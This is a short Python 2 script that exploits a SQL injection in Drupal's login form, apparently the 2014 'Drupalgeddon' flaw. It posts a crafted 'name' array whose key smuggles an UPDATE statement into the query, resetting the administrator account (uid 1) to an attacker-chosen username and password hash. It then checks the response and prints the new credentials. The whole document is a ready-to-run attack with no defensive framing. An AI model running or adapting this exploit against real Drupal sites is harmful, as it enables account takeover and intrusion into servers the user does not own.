import urllib2,sys
from drupalpass import DrupalHash 

host = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
if len(sys.argv) != 4:
    print "host username password"
    print "http://localhost/drupal admin wowsecure"

hash = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", 
  password).get_hash()
target = '%s/?q=node&destination=node' % host
post_data = "name[0%20;update+users+set+name%3d\'" \
            +user \
            +"'+,+pass+%3d+'" \
            +hash[:55] \
            +"'+where+uid+%3d+\'1\';;#%20%20]=bob&" \
            +"name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
content = urllib2.urlopen(url=target, data=post_data).read()

f = open('drupalsqliresponse.html', 'w')
f.write(content)
if "mb_strlen() expects parameter 1" in content:
        print "Success!\nLogin now with user:%s and pass:%s" % (user, password)